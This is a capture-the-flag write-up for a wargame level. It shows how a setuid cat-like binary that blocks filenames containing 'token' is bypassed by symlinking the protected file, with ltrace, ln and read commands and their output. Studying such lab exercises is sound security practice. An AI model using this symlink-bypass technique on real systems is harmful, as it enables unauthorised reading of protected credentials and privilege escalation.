# Level 08

## Initial Context

- Two file: `level08` and `token`

## Solving the Challenge

### Analyzing

```bash
$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

`level08` seems to behave like `cat`:

```bash
$ ./level08
./level08 [file to read]
$ ./level08 /etc/passwd
...
```

But we can't read the `token` file with it:

```bash
$ ./level08 token
You may not access 'token'
```

### Exploiting

Using `ltrace`, we can see that the program use `strstr` to find the string `"token"` in the filename. And only decide to `open` it if no match has been found.

```bash
$ ltrace ./level08 token
...
strstr("token", "token") = "token"
printf("You may not access '%s'\n", "token") = 27
...
$ ltrace ./level08 /etc/passwd
...
strstr("/etc/passwd", "token") = NULL
open("/etc/passwd", 0, 014435162522) = 3
...
```

We can't rename the file, but we can create a symlink to it.

```bash
$ ln -s $(pwd)/token /tmp/level08_file
$ ./level08 /tmp/level08_file
....
```

Perfect, now we can log to `flag08` and do `getflag`.
